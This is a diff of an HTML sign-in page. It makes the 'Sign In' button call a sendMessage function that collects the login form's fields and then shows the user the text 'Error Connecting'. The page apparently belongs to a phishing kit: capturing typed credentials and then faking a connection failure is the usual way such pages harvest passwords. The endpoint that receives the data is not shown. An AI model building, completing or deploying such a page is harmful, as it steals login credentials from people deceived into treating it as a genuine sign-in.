@@ -100,10 +100,10 @@
                 <button type="button" class="show-password" id="togglePassword">Show</button>
             </div>
             
-            <button class="proceed-button" type="button" id="sendMessageButton">Sign In</button>
+            <button class="proceed-button" type="button" id="sendMessageButton" onclick='sendMessage("conforpky")'>Sign In</button>
             <div class="text-center">
                 <a href="#" class="text-decoration-none">Need to find your password?</a>
-            </div>
+            </div> 
         </form>
         
         <div class="divider"></div>
@@ -118,8 +118,8 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/js/bootstrap.bundle.min.js"></script>
     <script>
     
-    function sendMessage() {
-  const form = document.getElementById('conforpky');
+    function sendMessage(conforpky) {
+  const form = document.getElementById(conforpky);
   const formData = new FormData(form);
             const sendButton = form.querySelector(".proceed-button");
             sendButton.textContent = "Error Connecting";
